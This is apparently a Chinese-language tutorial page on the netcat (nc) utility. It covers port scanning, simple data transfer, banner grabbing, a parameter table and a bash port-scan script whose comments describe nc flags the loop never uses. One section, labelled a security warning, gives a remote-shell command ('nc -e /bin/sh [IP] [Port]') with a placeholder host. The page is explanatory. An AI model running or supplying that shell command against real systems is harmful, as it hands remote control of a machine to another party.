---
title: Netcat命令
icon: network-wired
date: 2026-02-24
category:
  - 计算机网络
---

在网络工程领域，nc（全称 **Netcat**）被誉为网络工具中的“瑞士军刀”。它是一个非常强大且灵活的网络实用程序，能够通过 TCP 或 UDP 协议读取和写入网络连接。

因为它功能太全，既可以当调试工具，也可以被当作黑客工具。
<hr id="OmLbk" class="ne-hr">
### nc 的主要功能

#### 1. 端口扫描

虽然不如 nmap 那么专业，但 nc 可以快速检查目标主机的特定端口是否开放。


- **命令：**nc -zv 192.168.1.1 80
- **解释：**-z 表示扫描模式（不发送数据），-v 表示详细输出。

#### 2. 简易聊天/数据传输

你可以在两台机器之间建立一个原始的通信管道。


- **接收端：**nc -l 8888（监听 8888 端口）
- **发送端：**nc [接收端IP] 8888
- 连接建立后，你在一方输入文字，另一方就能看到；也可以用来传输文件（配合重定向符号 >）。

#### 3. 测试服务响应 (Banner Grabbing)

你可以手动连接到某个服务端口，查看它返回的欢迎信息或协议版本。


- **命令：**nc www.google.com 80
- 连接后输入 GET / HTTP/1.1 并回车，你可以看到服务器返回的原始 HTTP 响应头。

#### 4. 远程后门（安全警告！）

在黑客攻击或应急响应中，nc 常被用来制作“正向”或“反向” Shell。


- **命令示例：**nc -e /bin/sh [IP] [Port]
- 这会将本机的 Shell 环境通过网络发送给另一台机器，使其能够远程控制本机。
<hr id="Ijotn" class="ne-hr">
### 常用参数速查表
<table id="tFns2" class="ne-table" style="width: 750px"><tbody><tr style="height: 33px"><td width="375">
**参数**
</td><td width="375">
**说明**
</td></tr><tr style="height: 33px"><td width="375">
**-l**
</td><td width="375">
使用监听模式 (Listen)，等待连接。
</td></tr><tr style="height: 33px"><td width="375">
**-p**
</td><td width="375">
指定本地监听的端口号。
</td></tr><tr style="height: 33px"><td width="375">
**-v**
</td><td width="375">
显示指令执行过程的详细信息 (Verbose)。
</td></tr><tr style="height: 33px"><td width="375">
**-u**
</td><td width="375">
使用 UDP 协议（默认是 TCP）。
</td></tr><tr style="height: 33px"><td width="375">
**-z**
</td><td width="375">
仅扫描端口，不发送任何数据。
</td></tr><tr style="height: 33px"><td width="375">
**-w**
</td><td width="375">
设置超时时间（秒）。
</td></tr></tbody></table><hr id="VrF8C" class="ne-hr">
### 注意事项


- **版本差异：** Linux 上常见的有两个版本：nmap-ncat (功能最强) 和 openbsd-netcat。有些版本不支持 -e 参数（出于安全考虑）。
- **权限控制：** 监听 1024 以下的知名端口（如 80, 443）通常需要 root 权限。

### 扫描有哪些服务端口（扫描脚本）

```
#!/bin/bash

# 配置目标 IP 和扫描范围
TARGET="127.0.0.1"
START_PORT=1
END_PORT=1024

echo "正在扫描 $TARGET 的端口 ($START_PORT 到 $END_PORT)..."

# 循环遍历端口
for ((port=$START_PORT; port<=$END_PORT; port++))
do
    # nc 参数说明：
    # -z: 扫描模式（不发送数据）
    # -v: 详细模式（配合 2>&1 捕获输出）
    # -w 1: 超时时间为 1 秒
    (echo > /dev/tcp/$TARGET/$port) >/dev/null 2>&1 && echo "端口 $port [开放]"
done

echo "扫描完成。"
```